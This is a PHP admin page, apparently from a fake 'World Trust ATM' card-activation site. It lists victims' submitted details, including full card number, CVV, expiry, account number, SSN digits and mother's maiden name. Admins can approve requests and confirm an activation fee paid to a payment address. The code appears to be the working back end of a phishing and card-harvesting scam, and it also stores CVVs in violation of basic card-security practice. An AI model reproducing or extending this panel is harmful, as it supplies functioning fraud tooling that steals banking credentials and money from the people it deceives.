<?php
/**
 * World Trust ATM - Admin View Request
 */

session_start();

// Check if logged in
if (!isset($_SESSION['admin_logged_in'])) {
    header('Location: index.php');
    exit();
}

require_once '../includes/config.php';
require_once '../includes/functions.php';
require_once '../includes/database.php';

$request_id = intval($_GET['id'] ?? 0);
$request = get_activation_request($request_id);

if (!$request) {
    header('Location: dashboard.php');
    exit();
}

// Handle status update
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $notes = trim($_POST['notes'] ?? '');
    
    if ($action === 'approve') {
        update_activation_status($request_id, 'approved', $_SESSION['admin_username'], $notes);
    } elseif ($action === 'reject') {
        update_activation_status($request_id, 'rejected', $_SESSION['admin_username'], $notes);
    } elseif ($action === 'verify_payment') {
        update_payment_status($request_id, 'completed');
    }
    
    // Reload the page to show updated data
    header('Location: view.php?id=' . $request_id);
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?> - View Request</title>
    <link rel="stylesheet" href="../css/styles.css">
</head>
<body>
    <div class="container">
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline">Activation Request Details</p>
        </header>

        <div class="form-container">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h2 class="form-title">Request #<?php echo str_pad($request['id'], 6, '0', STR_PAD_LEFT); ?></h2>
                <a href="dashboard.php" class="btn" style="width: auto; padding: 10px 20px; background: var(--text-light);">← Back</a>
            </div>
            
            <div class="info-box" style="margin-bottom: 20px;">
                <div class="info-item">
                    <span class="info-label">Status:</span>
                    <span class="status-badge <?php echo $request['status']; ?>"><?php echo ucfirst($request['status']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Submitted:</span>
                    <span class="info-value"><?php echo date('F j, Y g:i A', strtotime($request['created_at'])); ?></span>
                </div>
                <?php if ($request['reviewed_at']): ?>
                <div class="info-item">
                    <span class="info-label">Reviewed:</span>
                    <span class="info-value"><?php echo date('F j, Y g:i A', strtotime($request['reviewed_at'])); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Reviewed By:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['reviewed_by']); ?></span>
                </div>
                <?php endif; ?>
            </div>

            <h3 class="section-title">Personal Information</h3>
            <div class="info-box">
                <div class="info-item">
                    <span class="info-label">Full Name:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['first_name'] . ' ' . $request['last_name']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Date of Birth:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['dob']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Email:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['email']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Phone:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['phone']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Address:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['street'] . ', ' . $request['city'] . ', ' . $request['state'] . ' ' . $request['zip']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Account Number:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['account_number']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">SSN (Last 4):</span>
                    <span class="info-value">****<?php echo htmlspecialchars($request['ssn_last4']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Mother's Maiden Name:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['maiden_name']); ?></span>
                </div>
            </div>

            <h3 class="section-title" style="margin-top: 30px;">Card Information</h3>
            <div class="info-box">
                <div class="info-item">
                    <span class="info-label">Card Number:</span>
                    <span class="info-value">**** **** **** <?php echo substr($request['card_number'], -4); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Full Card Number:</span>
                    <span class="info-value"><?php echo htmlspecialchars(chunk_split($request['card_number'], 4, ' ')); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">CVV:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['cvv']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Expiry Date:</span>
                    <span class="info-value"><?php echo htmlspecialchars($request['expiry_date']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Balance:</span>
                    <span class="info-value"><?php echo format_currency($request['balance']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">PIN:</span>
                    <span class="info-value"><?php echo !empty($request['pin_hash']) ? 'Set (Hashed)' : 'Not Set'; ?></span>
                </div>
            </div>

            <h3 class="section-title" style="margin-top: 30px;">Payment Information</h3>
            <div class="info-box">
                <div class="info-item">
                    <span class="info-label">Payment Method:</span>
                    <span class="info-value"><?php echo $request['payment_method'] ? strtoupper(htmlspecialchars($request['payment_method'])) : 'Not Selected'; ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Payment Status:</span>
                    <span class="status-badge <?php echo $request['payment_status']; ?>"><?php echo ucfirst($request['payment_status']); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Payment Address:</span>
                    <span class="info-value" style="font-size: 12px; word-break: break-all;"><?php echo $request['payment_address'] ? htmlspecialchars($request['payment_address']) : 'N/A'; ?></span>
                </div>
            </div>

            <?php if ($request['admin_notes']): ?>
            <h3 class="section-title" style="margin-top: 30px;">Admin Notes</h3>
            <div class="alert-box">
                <p><?php echo nl2br(htmlspecialchars($request['admin_notes'])); ?></p>
            </div>
            <?php endif; ?>

            <!-- Payment Verification -->
            <?php if ($request['payment_method'] && $request['payment_status'] === 'pending'): ?>
            <div style="margin-top: 30px;">
                <h3 class="section-title">Payment Verification</h3>
                <form method="POST">
                    <button type="submit" name="action" value="verify_payment" class="btn btn-primary" style="background: var(--success-green); width: auto;" onclick="return confirm('Mark this payment as verified and completed?')">
                        ✓ Mark Payment as Completed
                    </button>
                </form>
            </div>
            <?php endif; ?>

            <?php if ($request['status'] === 'pending'): ?>
            <div style="margin-top: 30px;">
                <h3 class="section-title">Take Action</h3>
                <form method="POST">
                    <div class="form-group">
                        <label for="notes">Admin Notes (Optional)</label>
                        <textarea id="notes" name="notes" rows="3" style="width: 100%; padding: 12px; border: 2px solid var(--border-color); border-radius: 8px; font-family: inherit;"></textarea>
                    </div>
                    
                    <div style="display: flex; gap: 10px;">
                        <button type="submit" name="action" value="approve" class="btn btn-primary" style="background: var(--success-green); width: auto;" onclick="return confirm('Approve this activation request?')">
                            ✓ Approve Request
                        </button>
                        <button type="submit" name="action" value="reject" class="btn" style="background: var(--error-red); color: white; width: auto;" onclick="return confirm('Reject this activation request?')">
                            ✗ Reject Request
                        </button>
                    </div>
                </form>
            </div>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>
